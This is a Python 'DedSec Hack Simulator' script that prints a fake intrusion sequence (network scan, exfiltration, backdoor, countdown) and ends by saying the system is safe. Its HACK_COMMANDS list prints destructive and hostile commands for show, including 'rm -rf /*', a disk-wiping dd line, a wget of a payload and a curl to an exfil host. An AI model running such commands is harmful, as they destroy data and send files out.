#!/usr/bin/env python3
import os
import random
import time
import platform
import socket
import psutil
import datetime
from threading import Thread

# Check if colorama is available, and import it if it is
try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    # Create mock color objects if colorama is not available
    class MockColor:
        def __getattr__(self, name):
            return ""
    
    Fore = MockColor()
    Back = MockColor()
    Style = MockColor()
    HAS_COLOR = False

# ASCII Art logo
DEDSEC_LOGO = '''
  ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
  ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
  ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
  ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
  ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
    W E ' R E   W A T C H I N G   Y O U . . .
'''

# Fake file paths that might look realistic
FILE_PATHS = [
    "/usr/local/bin/",
    "/var/log/",
    "/etc/passwd",
    "/etc/shadow",
    "/home/user/Documents/",
    "/home/user/Downloads/",
    "/Applications/",
    "C:\\Windows\\System32\\",
    "C:\\Users\\",
    "C:\\Program Files\\",
    "D:\\Backup\\",
]

# Fake commands that might be executed during a "hack"
HACK_COMMANDS = [
    "nmap -sS -p- target_machine",
    "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target",
    "sqlmap --url=http://target-site.com --dbs",
    "dirb http://target-site.com /usr/share/wordlists/dirb/common.txt",
    "ssh user@target",
    "cat /etc/passwd",
    "sudo su -",
    "chmod 777 /var/www/html",
    "rm -rf /*",  # Don't worry, this is just for show
    "dd if=/dev/zero of=/dev/sda",  # Also just for show
    "wget http://dedsec-server.net/payload.php",
    "curl -s https://dedsec-c2.onion/exfil",
    "./dedsec_rootkit install --stealth",
]

# Fake processes that might be "discovered"
FAKE_PROCESSES = [
    "chrome.exe",
    "firefox.exe",
    "safari",
    "explorer.exe",
    "notepad.exe",
    "Word.exe",
    "Excel.exe",
    "Terminal",
    "cmd.exe",
    "powershell.exe",
    "slack",
    "discord",
    "spotify",
    "steam",
    "outlook.exe",
    "iTunes",
    "SystemSettings",
]

# Fake ports and services
FAKE_PORTS_SERVICES = [
    (21, "FTP"),
    (22, "SSH"),
    (23, "Telnet"),
    (25, "SMTP"),
    (53, "DNS"),
    (80, "HTTP"),
    (110, "POP3"),
    (143, "IMAP"),
    (443, "HTTPS"),
    (445, "SMB"),
    (3306, "MySQL"),
    (3389, "RDP"),
    (5432, "PostgreSQL"),
    (8080, "HTTP-Proxy"),
]

# Fake vulnerabilities
FAKE_VULNS = [
    "CVE-2021-44228 (Log4Shell)",
    "CVE-2022-22965 (Spring4Shell)",
    "CVE-2019-19781 (Citrix RCE)",
    "CVE-2021-26855 (Microsoft Exchange ProxyLogon)",
    "CVE-2017-0144 (EternalBlue)",
    "CVE-2020-1472 (Zerologon)",
    "CVE-2021-34527 (PrintNightmare)",
    "CVE-2021-41773 (Apache Path Traversal)",
    "CVE-2022-30190 (Follina)",
    "CVE-2023-20593 (MOVEit Transfer)",
]

# Get real system info
def get_system_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        username = os.getlogin()
        
        cpu_usage = psutil.cpu_percent()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            "hostname": hostname,
            "ip": ip,
            "system": f"{system} {release}",
            "username": username,
            "cpu": cpu_usage,
            "memory": memory.percent,
            "disk": disk.percent,
            "interfaces": [iface for iface in psutil.net_if_addrs().keys()]
        }
    except Exception as e:
        # Fall back to mock data if there's an issue
        return {
            "hostname": "USER-PC",
            "ip": "192.168.1.105",
            "system": "Windows 10",
            "username": "User",
            "cpu": 35.2,
            "memory": 62.4,
            "disk": 73.8,
            "interfaces": ["Ethernet", "Wi-Fi", "Bluetooth"]
        }

# Slow typing effect
def type_text(text, delay=0.03):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

# Progress bar animation
def progress_bar(length=40, fill='█', empty='░', prefix='', suffix='', time_total=3.0):
    steps = 100
    step_time = time_total / steps
    
    for i in range(steps + 1):
        percent = i / steps
        filled_length = int(length * percent)
        bar = fill * filled_length + empty * (length - filled_length)
        
        print(f'\r{prefix} [{bar}] {int(percent * 100)}% {suffix}', end='', flush=True)
        time.sleep(step_time)
    
    print()

# Matrix-like raining code effect
def matrix_rain(duration=5):
    if not HAS_COLOR:
        print("Simulating Matrix rain effect... (Install colorama for full visual effect)")
        time.sleep(duration)
        return
        
    try:
        width = os.get_terminal_size().columns
    except:
        width = 80  # Fallback if terminal size can't be determined
    
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=_+[]{}|;':,./<>?"
    end_time = time.time() + duration
    
    while time.time() < end_time:
        line = ''
        for _ in range(width):
            if random.random() > 0.7:  # 30% chance of showing a character
                line += Fore.GREEN + random.choice(chars)
            else:
                line += ' '
        print(line)
        time.sleep(0.05)

# Simulate IP scanning
def scan_network():
    print(f"{Fore.CYAN}[*] Scanning local network...")
    progress_bar(prefix="    ", suffix="Scanning Subnet", time_total=2.0)
    
    base_ip = ".".join(get_system_info()["ip"].split(".")[0:3]) + "."
    
    print(f"{Fore.GREEN}[+] Network scan complete. Discovered devices:")
    for i in range(5):
        ip = f"{base_ip}{random.randint(1, 254)}"
        mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        device_type = random.choice(["Router", "Computer", "Smartphone", "IoT Device", "Smart TV", "Gaming Console"])
        print(f"    {Fore.WHITE}Device: {ip.ljust(15)} MAC: {mac.ljust(17)} Type: {device_type}")
        time.sleep(0.3)

# Simulate file access
def access_files():
    print(f"{Fore.CYAN}[*] Searching for sensitive files...")
    progress_bar(prefix="    ", suffix="Crawling filesystem", time_total=1.5)
    
    print(f"{Fore.GREEN}[+] Found interesting files:")
    for _ in range(6):
        path = random.choice(FILE_PATHS)
        filename = random.choice([
            "password.txt", 
            "config.xml", 
            "database.db", 
            "credentials.json", 
            "backup.zip",
            "private_key.pem",
            "wallet.dat",
            "contacts.xlsx",
            "tax_return_2024.pdf",
            "credit_card_details.csv"
        ])
        size = f"{random.randint(1, 1024)}{random.choice(['B', 'KB', 'MB'])}"
        date = (datetime.datetime.now() - datetime.timedelta(days=random.randint(1, 365))).strftime("%Y-%m-%d %H:%M")
        
        print(f"    {Fore.WHITE}{path}{filename.ljust(25)} Size: {size.ljust(8)} Modified: {date}")
        time.sleep(0.2)

# Simulate process injection
def inject_processes():
    print(f"{Fore.CYAN}[*] Analyzing running processes...")
    progress_bar(prefix="    ", suffix="Scanning processes", time_total=1.8)
    
    print(f"{Fore.GREEN}[+] Targeting vulnerable processes:")
    for _ in range(4):
        pid = random.randint(1000, 9999)
        process = random.choice(FAKE_PROCESSES)
        user = random.choice(["SYSTEM", "root", get_system_info()["username"], "admin"])
        memory = f"{random.randint(10, 500)} MB"
        
        print(f"    {Fore.WHITE}PID: {str(pid).ljust(6)} Process: {process.ljust(15)} User: {user.ljust(10)} Memory: {memory}")
        time.sleep(0.3)
    
    print(f"{Fore.YELLOW}[*] Injecting payload into process...")
    target_pid = random.randint(1000, 9999)
    target_process = random.choice(FAKE_PROCESSES)
    progress_bar(prefix="    ", suffix=f"Injecting into {target_process} (PID: {target_pid})", time_total=2.0)
    print(f"{Fore.GREEN}[+] Payload successfully injected. Establishing persistence...")
    time.sleep(0.5)

# Simulate port scanning
def scan_ports():
    print(f"{Fore.CYAN}[*] Scanning for open ports...")
    progress_bar(prefix="    ", suffix="Port scanning", time_total=2.0)
    
    print(f"{Fore.GREEN}[+] Open ports discovered:")
    used_ports = random.sample(FAKE_PORTS_SERVICES, k=random.randint(3, 7))
    for port, service in used_ports:
        state = random.choice(["OPEN", "FILTERED", "OPEN|FILTERED"])
        print(f"    {Fore.WHITE}Port: {str(port).ljust(5)} State: {state.ljust(12)} Service: {service}")
        time.sleep(0.2)

# Simulate vulnerability scanning
def find_vulnerabilities():
    print(f"{Fore.CYAN}[*] Scanning for vulnerabilities...")
    progress_bar(prefix="    ", suffix="Running vulnerability scan", time_total=2.5)
    
    vuln_count = random.randint(2, 5)
    vulns = random.sample(FAKE_VULNS, k=vuln_count)
    
    print(f"{Fore.GREEN}[+] {vuln_count} vulnerabilities found:")
    for vuln in vulns:
        severity = random.choice(["Critical", "High", "Medium", "Low"])
        severity_color = {
            "Critical": Fore.RED,
            "High": Fore.YELLOW,
            "Medium": Fore.CYAN,
            "Low": Fore.GREEN
        }.get(severity, Fore.WHITE)
        
        print(f"    {severity_color}[{severity.upper()}] {vuln}")
        time.sleep(0.3)
    
    exploitable = random.choice(vulns)
    print(f"{Fore.YELLOW}[*] Preparing to exploit: {exploitable}")
    time.sleep(0.5)

# Simulate data exfiltration
def exfiltrate_data():
    print(f"{Fore.CYAN}[*] Gathering sensitive data...")
    data_types = [
        "Personal Documents",
        "Browser History",
        "Email Correspondence",
        "SSH Keys",
        "API Tokens",
        "Password Database",
        "Financial Records",
        "Photos",
        "Browser Cookies",
        "Contact List"
    ]
    
    selected_data = random.sample(data_types, k=random.randint(3, 6))
    total_size = random.randint(50, 500)
    
    print(f"{Fore.GREEN}[+] Found {len(selected_data)} data categories ({total_size} MB):")
    for data in selected_data:
        size = f"{random.randint(5, 100)} MB"
        count = random.randint(10, 1000)
        print(f"    {Fore.WHITE}{data.ljust(20)} Size: {size.ljust(8)} Items: {count}")
        time.sleep(0.2)
    
    print(f"{Fore.YELLOW}[*] Compressing and encrypting data...")
    progress_bar(prefix="    ", suffix="Preparing for exfiltration", time_total=1.5)
    
    print(f"{Fore.YELLOW}[*] Establishing secure channel to DedSec server...")
    server = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    progress_bar(prefix="    ", suffix=f"Connecting to {server}", time_total=1.0)
    
    print(f"{Fore.YELLOW}[*] Uploading data...")
    progress_bar(prefix="    ", suffix=f"Uploading {total_size} MB", time_total=3.0)
    
    print(f"{Fore.GREEN}[+] Data exfiltration complete")
    time.sleep(0.5)

# Simulate backdoor installation
def install_backdoor():
    print(f"{Fore.CYAN}[*] Preparing persistence mechanism...")
    backdoor_types = [
        "Kernel rootkit",
        "Registry autorun",
        "Cron job",
        "Startup script",
        "Service installation",
        "Browser extension",
        "Driver modification",
        "Boot sector infection"
    ]
    
    backdoor = random.choice(backdoor_types)
    progress_bar(prefix="    ", suffix=f"Installing {backdoor}", time_total=2.0)
    
    print(f"{Fore.GREEN}[+] Installed {backdoor} for persistent access")
    
    # Show connection details
    c2_server = f"dedsec-c2-{random.randint(1, 99)}.onion"
    print(f"{Fore.YELLOW}[*] Establishing connection to Command & Control server...")
    progress_bar(prefix="    ", suffix=f"Connecting to {c2_server}", time_total=2.0)
    print(f"{Fore.GREEN}[+] Connection established with C2 server: {c2_server}")
    port = random.choice([443, 8080, 8443, 22, 53])
    interval = random.randint(30, 180)
    
    print(f"{Fore.GREEN}[+] Backdoor configuration:")
    print(f"    {Fore.WHITE}C2 Server:     {c2_server}")
    print(f"    {Fore.WHITE}Port:          {port}")
    print(f"    {Fore.WHITE}Check Interval: {interval} seconds")
    print(f"    {Fore.WHITE}Protocol:      {random.choice(['HTTPS', 'DNS', 'SSH', 'ICMP'])}")
    time.sleep(0.5)

# Display fake command execution
def run_commands():
    print(f"{Fore.CYAN}[*] Executing commands...")
    
    for _ in range(random.randint(4, 8)):
        command = random.choice(HACK_COMMANDS)
        print(f"{Fore.WHITE}$ {command}")
        time.sleep(0.3)
        
        # Sometimes show output
        if random.random() > 0.3:
            lines = random.randint(1, 5)
            for _ in range(lines):
                output = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=_+[]{}|;':,./<>? ") for _ in range(random.randint(30, 80))])
                print(f"  {output}")
                time.sleep(0.1)
        
        time.sleep(0.2)

# Simulate a control takeover
def take_control():
    print(f"{Fore.YELLOW}[*] Taking control of your system...")
    progress_bar(prefix="    ", suffix="Hijacking interface", time_total=2.0)
    
    print(f"{Fore.GREEN}[+] System control acquired")
    
    # Simulate controlling various system aspects
    controls = [
        "Webcam", "Microphone", "Screen", "Keyboard", "Mouse", 
        "File System", "Network Access", "USB Devices"
    ]
    
    for control in random.sample(controls, k=random.randint(3, 6)):
        print(f"{Fore.WHITE}    > Accessing {control}...")
        progress_bar(prefix="      ", suffix=f"Taking control of {control}", time_total=1.0)
        print(f"{Fore.GREEN}      SUCCESS: {control} now under DedSec control")
        time.sleep(0.3)

# Final messages before "system shutdown"
def final_takeover():
    messages = [
        "WE ARE DEDSEC.",
        "YOUR SYSTEM IS NOW PART OF OUR NETWORK.",
        "WE HAVE ALL YOUR DATA.",
        "WE ARE WATCHING YOU.",
        "JOIN US OR BE EXPOSED.",
        "EXPECT US.",
    ]
    
    print()
    for msg in messages:
        print(f"{Fore.RED}{Style.BRIGHT}{msg}")
        time.sleep(1)
    
    print()
    type_text(f"{Fore.RED}{Style.BRIGHT}INITIATING SYSTEM PURGE IN:")
    for i in range(5, 0, -1):
        print(f"{Fore.RED}{Style.BRIGHT}{i}...", end="", flush=True)
        time.sleep(1)
    print()

# Main execution function
def run_hack():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display logo
    print(f"{Fore.GREEN}{DEDSEC_LOGO}")
    time.sleep(1)
    
    # Display mock loading
    print(f"{Fore.CYAN}Initializing DedSec penetration toolkit...")
    progress_bar(prefix="", suffix="Loading modules", time_total=2.0)
    
    # Get and display system info
    print(f"{Fore.CYAN}[*] Gathering system information...")
    sys_info = get_system_info()
    
    print(f"{Fore.GREEN}[+] System information:")
    print(f"    {Fore.WHITE}Hostname:  {sys_info['hostname']}")
    print(f"    {Fore.WHITE}IP Address: {sys_info['ip']}")
    print(f"    {Fore.WHITE}OS:         {sys_info['system']}")
    print(f"    {Fore.WHITE}User:       {sys_info['username']}")
    print(f"    {Fore.WHITE}CPU Usage:  {sys_info['cpu']}%")
    print(f"    {Fore.WHITE}Memory:     {sys_info['memory']}%")
    print(f"    {Fore.WHITE}Disk:       {sys_info['disk']}%")
    print(f"    {Fore.WHITE}Network:    {', '.join(sys_info['interfaces'])}")
    time.sleep(1)
    
    # Run the "hack" sequence
    print(f"\n{Fore.YELLOW}[!] !! SECURITY BREACH DETECTED !!")
    print(f"{Fore.YELLOW}[!] Unauthorized access in progress...\n")
    time.sleep(1)
    
    # Run various "hacking" modules
    scan_network()
    print()
    
    scan_ports()
    print()
    
    find_vulnerabilities()
    print()
    
    run_commands()
    print()
    
    access_files()
    print()
    
    inject_processes()
    print()
    
    exfiltrate_data()
    print()
    
    install_backdoor()
    print()
    
    take_control()
    print()
    
    # Matrix effect
    print(f"{Fore.GREEN}[*] Executing core payload...")
    time.sleep(0.5)
    matrix_rain(duration=3)
    
    # Final takeover message
    final_takeover()
    
    print(f"{Fore.GREEN}{Style.BRIGHT}")
    type_text("This was a simulation. Your system is safe! :)")
    type_text("DedSec Hack Simulator - Created for educational purposes only")

if __name__ == "__main__":
    # Check for required modules
    missing_modules = []
    for module in ["psutil"]:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"{Fore.YELLOW}Warning: Missing required modules: {', '.join(missing_modules)}")
        print(f"{Fore.WHITE}Install them with: pip install {' '.join(missing_modules)}")
        print("The script will try to run with limited functionality.\n")
        time.sleep(2)
    
    try:
        run_hack()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}Hack simulation aborted by user.")
    except Exception as e:
        print(f"\n\n{Fore.RED}An error occurred: {str(e)}")
    
    input("\nPress Enter to exit...")